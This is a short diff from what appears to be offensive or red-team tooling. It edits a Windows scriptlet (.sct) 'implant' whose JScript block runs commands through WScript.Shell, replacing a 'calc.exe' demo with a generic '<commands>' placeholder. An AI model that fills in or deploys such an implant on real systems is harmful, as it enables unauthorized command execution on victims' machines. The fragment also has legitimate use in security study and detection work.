@@ -27,7 +27,7 @@ Execute a SCT implant.
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
     <script language="JScript">
         <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
+            var r = new ActiveXObject("WScript.Shell").Run("<commands>");    
         ]]>
 </script>
 </registration>
